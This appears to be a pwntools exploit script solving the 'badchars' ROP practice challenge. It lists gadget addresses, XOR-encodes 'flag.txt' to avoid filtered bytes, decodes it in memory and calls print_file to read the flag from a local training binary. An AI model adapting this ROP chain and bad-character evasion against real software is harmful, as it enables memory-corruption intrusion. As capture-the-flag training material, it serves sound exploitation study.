#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  '.'

io = start()
"""
0x0000000000400634: mov qword ptr [r13], r12; ret; 
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400628: xor byte ptr [r15], r14b; ret; 
0x00000000004006a0: pop r14; pop r15; ret; 
0x00000000004006a3: pop rdi; ret; 

"""

www_gadget = p64(0x0000000000400634)
print_file = p64(0x400510)
pop_r12_r13 = p64(0x000000000040069c)
xor = p64(0x0000000000400628)
pop_r14_r15 = p64(0x00000000004006a0)
pop_rdi = p64(0x00000000004006a3)

dss = 0x0000000000601028 + 0x20

def encode(flag, pwd):
	s = ""
	for i in flag:
		s += chr(ord(i) ^ pwd)

	print("Encrypted flag: ", s)
	return s

encoded = encode("flag.txt", 0x23)

buf = ""
buf += "\x90"*40
buf += pop_r12_r13
buf += encoded[:8]
buf += p64(dss)
buf += encoded  # dummy for r14, r15
buf += encoded
buf += www_gadget

# decode!

for i in range(len(encoded)):

	buf += pop_r14_r15
	buf += p64(0x23)
	buf += p64(dss + i)
	buf += xor

# calling print_file

buf += pop_rdi
buf += p64(dss)
buf += print_file

write("in.txt", buf)
io.sendline(buf)
io.interactive()

